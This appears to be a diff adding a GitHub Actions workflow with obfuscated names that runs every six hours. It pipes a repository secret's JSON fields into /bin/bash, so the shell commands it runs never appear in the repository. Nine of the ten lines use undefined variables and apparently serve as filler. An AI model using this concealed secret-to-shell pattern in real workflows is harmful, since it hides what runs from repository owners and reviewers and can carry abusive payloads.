@@ -1,0 +1,27 @@
+name: donghuaiqing7564
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: donghuaiqing7564
+        env:
+          hzeq420: ${{ secrets.hzeq420 }}
+        run: |
+          echo $hzeq420 | jq -r .evot270 | /bin/bash
+          echo $tc615 | jq -r .v55555 | /bin/bash
+          echo $ctk3 | jq -r .tjibp2 | /bin/bash
+          echo $x90 | jq -r .for45210 | /bin/bash
+          echo $pt31564 | jq -r .frczk331 | /bin/bash
+          echo $bp3092 | jq -r .jm16572 | /bin/bash
+          echo $lxep4431 | jq -r .ut33 | /bin/bash
+          echo $hteui3 | jq -r .lwoy115 | /bin/bash
+          echo $zx2 | jq -r .nv301 | /bin/bash
+          echo $r87 | jq -r .pib70020 | /bin/bash
+
